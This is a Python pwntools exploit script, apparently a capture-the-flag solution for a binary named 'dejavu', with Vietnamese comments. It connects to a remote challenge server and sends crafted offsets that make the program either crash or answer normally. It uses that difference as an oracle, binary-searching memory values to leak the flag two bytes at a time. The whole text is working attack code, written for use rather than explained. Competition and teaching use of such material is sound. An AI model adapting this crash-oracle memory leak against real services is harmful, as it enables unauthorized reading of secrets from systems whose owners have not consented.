from pwn import *
import sys
import os

# === CẤU HÌNH ===
exe = './dejavu'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'critical' 

# Offset
DOORS_ADDR = 0x4060
FLAG_ADDR  = 0x4080
START_IDX  = (FLAG_ADDR - DOORS_ADDR) // 2
MMAP_ADDR  = 0x10000 

# Tạo file flag giả để chắc chắn có dữ liệu test
with open("flag.txt", "w") as f:
    f.write("WannaGame{Verify_Success_Flag_Here}")

def oracle_check(idx, guess_val):
    try:
        # p = process(exe)
        p = remote("challenge.cnsc.com.vn", 32069)
        
        # Target = MMAP_ADDR (0x10000)
        # Nếu Real >= Guess -> Addr >= 0x10000 (Success)
        # Nếu Real < Guess  -> Addr < 0x10000 (Crash)
        payload_offset = MMAP_ADDR - guess_val
        if payload_offset < 0: payload_offset += 2**64

        # Gửi dữ liệu
        # Dùng sendline để đảm bảo có \n cho scanf
        p.sendlineafter(b"Which door", str(idx).encode())
        p.sendlineafter(b"How far", str(payload_offset).encode())
        
        # Trigger syscall read
        p.send(b'A' * 16)

        # Đọc phản hồi
        resp = p.recvall(timeout=0.2) # Đọc hết những gì có thể
        p.close()
        
        if b"Run away" in resp:
            return True
        return False
    except:
        return False

def binary_search(idx):
    low = 0
    high = 65535
    ans = 0
    while low <= high:
        mid = (low + high) // 2
        if oracle_check(idx, mid):
            ans = mid
            low = mid + 1
        else:
            high = mid - 1
    return ans

def solve():
    print(f"[*] Target: {exe}")
    print("------------------------------------------------")
    print("[1] VERIFYING EXPLOIT with doors[1]...")
    print("    Expected Value: 0x1000 (4096)")
    
    val_check = binary_search(1) # Index 1 của mảng doors
    print(f"    Leaked Value  : {hex(val_check)}")
    
    if val_check == 0x1000:
        print("[+] VERIFICATION PASSED! Exploit is working perfectly.")
    else:
        print("[-] VERIFICATION FAILED!")
        print(f"    Possible reasons: Wrong MMAP_ADDR (yours: {hex(MMAP_ADDR)}), or Scanf issues.")
        # Nếu fail, ta dừng lại để debug
        return

    print("------------------------------------------------")
    print("[2] LEAKING FLAG from index 16...")
    
    flag_str = b""
    for i in range(50):
        idx = START_IDX + i
        val = binary_search(idx)
        
        chunk = p16(val)
        sys.stdout.write(f"\r[+] Leaking... {flag_str}{chunk}")
        sys.stdout.flush()
        
        if val == 0:
            break
        flag_str += chunk

    print(f"\n\n[+] FULL FLAG: {flag_str.decode(errors='ignore')}")

if __name__ == "__main__":
    solve()